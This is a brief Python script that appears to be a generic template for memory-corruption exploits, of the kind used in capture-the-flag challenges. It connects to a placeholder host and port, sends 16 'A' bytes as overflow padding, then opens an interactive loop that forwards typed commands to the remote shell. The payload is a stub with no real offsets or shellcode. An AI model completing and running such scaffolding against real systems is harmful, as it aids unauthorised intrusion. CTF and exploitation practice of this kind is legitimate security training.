import struct
import socket

p = lambda x: struct.pack("<I", x)
u = lambda x: struct.unpack("<I", x)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("x.x.x.x", 1234))

payload = "A"*0x10

s.send(payload+"\n")

print(s.recv(1024))

while True:
    t = input("$ ")
    s.send(t+"\n")
    print(s.recv(1024))
s.close()